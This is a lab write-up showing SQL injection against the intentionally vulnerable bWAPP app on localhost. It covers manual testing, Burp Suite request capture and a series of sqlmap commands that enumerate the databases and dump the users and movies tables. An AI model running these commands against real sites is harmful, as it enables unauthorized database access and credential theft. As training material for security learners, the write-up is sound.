   # BWAPP BUGGY WEB LAB EXPLOITATION

## ‚ö†Ô∏è Caution & Legal Notice


#### All labs used in this repository are **intentionally vulnerable environments** created for **learning and research purposes only**.  
#### They are **legal to use** because they are designed for cybersecurity training and do not target any external systems.


## 1. Home page after accessing the lab

---

## 2. Login with *bee/bug* as username and password.

## 3. After login in choose a vulnerability to exploit(sql injection GET/search)
<img width="1920" height="947" alt="image" src="https://github.com/user-attachments/assets/6569abcb-63fd-4776-9948-8ebcf94d904f" />
---

## 4. After choosing the vulnerability to exploit: this is the page you get.
<img width="1920" height="947" alt="image" src="https://github.com/user-attachments/assets/0f718807-3a29-48a6-9a0c-7ebb0984d736" />
Description:
  This is a movie search webpage that after you search for a movie it sends a GET request to the server and the server gives back the movies searched for if they are in the database.
  
---

## 5. Confirm if the site is vulnerable to SQL INJECTION(manualy).
### step1: Identify a Faulty url that might show signs of vulnerabilities:
(http://localhost:8081/sqli_1.php?title=iron+man+&action=search)

This kind of url is likely injectable due to parameters like

Title= OR action=  
### step2: add a single quote ' to the movie search then search:
<img width="1920" height="947" alt="image" src="https://github.com/user-attachments/assets/8f1b3cb4-10cb-433e-b280-7b7c0631b5de" />
The quote returns back an SQL ERROR: Showing that its vulnerable to sql injection.

## Vulnerability confirmed!(manualy)

---

## 6. Now capture the REQUEST in Burpsuite.
### step1: In burpsuite turn ON the interceptor.
### step2: now search for a movie then see the request in burpsuite.
<img width="1920" height="947" alt="image" src="https://github.com/user-attachments/assets/f08bc99a-734c-4244-b6d3-504a15d3d830" />

#### This is the request for a movie from the site to the server. The method used is GET.
#### **since this is a GET request it gets printed to the URL**
#### SO we can just use the url dirrectly to exploit the Data base.

## 7. Now run sqlmap To CONFIRM the vulnerability AUTOMATICALY:
### step1: run a command like this to grab the banner:
```bash
   sqlmap -u "http://localhost:8081/sqli_1.php?title=iron+man+&action=search" --cookie="PHPSESSID=360f8c2qsn63ogbm5s321qnii4; security_level=0" --batch --banner
```
---
### command Description:

- sqlmap - tool 

- -u -url flag

- "http://localhost:8081/sqli_1.php?title=iron+man+&action=search" - the actual url after searching for a movie

- --cookie="PHPSESSID=360f8c2qsn63ogbm5s321qnii4; security_level=0" - your cookie get it from Burp suite in the REQUEST area

- --batch - flag to auto-answer all the questions for you

- --banner - a flag to grab the banner
  
## The results after running the command:
<img width="1920" height="947" alt="image" src="https://github.com/user-attachments/assets/80d49dbd-76b6-45bb-aca2-85b24d8023ba" />

It fetched the banner this is a huge sign that this website is vulnerable to sql injection.

now we have confirmed that is vulnerable:

### step2: Fetch all the DATAbases:
```bash
   sqlmap -u "http://localhost:8081/sqli_1.php?title=iron+man+&action=search" --cookie="PHPSESSID=360f8c2qsn63ogbm5s321qnii4; security_level=0" --batch --dbs
```

--dbs - a flag to grab and return all the databases available

<img width="1920" height="947" alt="image" src="https://github.com/user-attachments/assets/224ea620-af4e-42d2-bfb5-7aa3c981ec9f" />
the command returned back four databases

- bWAPP
- information_schema
- mysql
- performance_schema
  
In this case we will only use bWAPP because its the database in charge of the website since the site is called bwapp too.

### step3: Enumerate the bWAPP database
```bash
sqlmap -u "http://localhost:8081/sqli_1.php?title=iron+man+&action=search" --cookie="PHPSESSID=360f8c2qsn63ogbm5s321qnii4; security_level=0" --batch -D bWAPP --tables
```

- -D -flag to show the database (bwapp in this case).

- --tables -a flag to reutrn back all the tables in the database 

<img width="1920" height="947" alt="image" src="https://github.com/user-attachments/assets/5f05021f-d4d4-4149-9967-9aa16495df8d" />
The command returns back 5 tables 

- blog     
- heroes   
- movies   
- users    
- visitors

### step4: Enumerate the users table:
```bash
sqlmap -u "http://localhost:8081/sqli_1.php?title=iron+man+&action=search" --cookie="PHPSESSID=360f8c2qsn63ogbm5s321qnii4; security_level=0" --batch -D bWAPP -T users --columns
```

- -T -flag that show the table to attack
- --columns -flag that returns back the columns in the table given
## The results:
<img width="1920" height="947" alt="image" src="https://github.com/user-attachments/assets/78aef005-905d-43f5-a243-cc56b63149c1" />
The command pulls back 9 columns that follows:

- admin           
- activated      
- activation_code 
- email          
- id              
- login           
- password        
- reset_code      
- secret 

### step5: now see the content of the columns
```bash
sqlmap -u "http://localhost:8081/sqli_1.php?title=iron+man+&action=search" --cookie="PHPSESSID=360f8c2qsn63ogbm5s321qnii4; security_level=0" --batch -D bWAPP -T users -C admin,email,login,password --dump
```
- -C -flag to pull back the columns you want
- --dump -a flag to dump all the columns stated by the flag -C
 
<img width="1920" height="947" alt="image" src="https://github.com/user-attachments/assets/8daab99c-b152-493a-be8d-172e1aa1c90e" />
The command pulled back two users 

- A.I.M. and password bug
- bee    and password bug
---

## step6: now enumerate the movies table.
```bash 
sqlmap -u "http://localhost:8081/sqli_1.php?title=iron+man+&action=search" --cookie="PHPSESSID=360f8c2qsn63ogbm5s321qnii4; security_level=0" --batch -D bWAPP -T movies --dump 
```
<img width="1920" height="947" alt="image" src="https://github.com/user-attachments/assets/cf8d97f5-939e-4132-b690-44c864590c5f" />
The command returns back all the movies in the database

---

- The website is vulnerable to injection since we managed to dump all the movies and  the users in the database
- The databe mysql can also be exploited in the same way
- The sql injection can be prevented by sanitizing all the user input.
